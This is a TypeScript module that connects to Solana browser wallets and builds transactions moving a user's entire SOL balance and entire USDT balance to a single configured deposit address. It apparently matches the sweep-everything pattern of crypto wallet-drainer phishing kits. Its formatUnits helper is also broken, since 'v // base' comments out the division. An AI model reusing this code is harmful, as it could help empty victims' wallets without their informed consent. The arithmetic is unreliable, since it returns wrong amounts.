import bs58 from 'bs58'
import { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction } from '@solana/web3.js'
import { TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, createTransferInstruction } from '@solana/spl-token'
import { SOLANA_RPC, SOL_DEPOSIT_ADDRESS, SOL_USDT_MINT, SOL_AUTO_CREATE_ATA } from '../config'

function getAppKitSolanaProvider(): any {
  const w:any = window as any
  // try common AppKit placements (best effort)
  if (w.appkit?.solana) return w.appkit.solana
  if (w.__appkit?.solana) return w.__appkit.solana
  if (w.reown?.solana) return w.reown.solana
  return null
}

function normalizeSignature(res: any): string {
  if (!res) throw new Error('No signature returned')
  const sigAny = (typeof res === 'string' && res) ||
                 (res as any)?.signature ||
                 (Array.isArray(res) && (res as any[])[0]) ||
                 res
  if (sigAny instanceof Uint8Array) return bs58.encode(sigAny as Uint8Array)
  if (typeof sigAny === 'string') return sigAny as string
  throw new Error('Unsupported signature type from wallet')
}



function formatUnits(value: bigint, decimals: number): string {
  const neg = value < 0n
  const v = neg ? -value : value
  const base = 10n ** BigInt(decimals)
  const whole = v // base
  const frac = v % base
  const fracStr = frac.toString().padStart(decimals, '0').replace(/0+$/, '')
  return (neg ? '-' : '') + whole.toString() + (fracStr ? '.' + fracStr : '')
}

export function getInjectedSolanaProvider(): any {
  const w:any = window as any
  if (w.solana?.isPhantom) return w.solana
  if (w.solflare?.isSolflare) return w.solflare
  if (w.backpack?.solana) return w.backpack.solana
  return w.solana || null
}

export function getActiveSolanaProvider(): any {
  return getAppKitSolanaProvider() || getInjectedSolanaProvider()
}

export async function connectSolana() {
  const provider = getActiveSolanaProvider()
  if (!provider) throw new Error('No Solana provider found (AppKit or injected)')
  const res = await provider.connect ? provider.connect({ onlyIfTrusted: false }) : {}
  const publicKey = provider.publicKey || res?.publicKey
  if (!publicKey) throw new Error('No publicKey from provider')
  return { provider, publicKey }
}

export async function depositAllSol({ publicKey }:{ publicKey: PublicKey }) {
  const to = new PublicKey(SOL_DEPOSIT_ADDRESS)
  const connection = new Connection(SOLANA_RPC, 'confirmed')
  const balance = await connection.getBalance(publicKey)
  if (balance <= 0) throw new Error('SOL balance is 0')

  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
  const dummyIx = SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: to, lamports: 1 })
  const dummyMsg = new TransactionMessage({ payerKey: publicKey, recentBlockhash: blockhash, instructions: [dummyIx] }).compileToV0Message()
  const feeInfo = await connection.getFeeForMessage(dummyMsg, 'confirmed')
  const fee = feeInfo.value ?? 5000
  const lamports = balance - fee
  if (lamports <= 0) throw new Error('Not enough SOL to cover fee')

  const ix = SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: to, lamports })
  const msg = new TransactionMessage({ payerKey: publicKey, recentBlockhash: blockhash, instructions: [ix] }).compileToV0Message()
  const tx = new VersionedTransaction(msg)

  const provider = getActiveSolanaProvider()
  if (!provider?.signAndSendTransaction) throw new Error('No signAndSendTransaction on Solana provider')
  const _res = await provider.signAndSendTransaction(tx)
    const signature = normalizeSignature(_res)
  await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
  return { signature }
}

export async function depositAllUsdtSol({ publicKey }:{ publicKey: PublicKey }) {
  const connection = new Connection(SOLANA_RPC, 'confirmed')
  const mint = new PublicKey(SOL_USDT_MINT)
  const owner = publicKey

  const sourceAta = await getAssociatedTokenAddress(mint, owner, false, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID)
  let amountBig = 0n
  try {
    const balInfo = await connection.getTokenAccountBalance(sourceAta, 'confirmed')
    amountBig = BigInt(balInfo.value.amount || '0')
  } catch { amountBig = 0n }
  if (amountBig <= 0n) throw new Error('USDT (SPL) balance is 0 or no source token account')

  const destOwner = new PublicKey(SOL_DEPOSIT_ADDRESS)
  const destAta = await getAssociatedTokenAddress(mint, destOwner, false, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID)

  const ixs:any[] = []
  const destInfo = await connection.getAccountInfo(destAta, 'confirmed')
  if (!destInfo) {
    if (SOL_AUTO_CREATE_ATA) {
      ixs.push(createAssociatedTokenAccountInstruction(owner, destAta, destOwner, mint, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID))
    } else {
      throw new Error('Destination USDT ATA missing. Enable SOL_AUTO_CREATE_ATA or create it manually.')
    }
  }
  ixs.push(createTransferInstruction(sourceAta, destAta, owner, amountBig, [], TOKEN_PROGRAM_ID))

  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
  const msg = new TransactionMessage({ payerKey: owner, recentBlockhash: blockhash, instructions: ixs }).compileToV0Message()
  const tx = new VersionedTransaction(msg)

  const provider = getActiveSolanaProvider()
  if (!provider?.signAndSendTransaction) throw new Error('No signAndSendTransaction on Solana provider')
  const _res = await provider.signAndSendTransaction(tx)
    const signature = normalizeSignature(_res)
  await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
  return { signature }
}
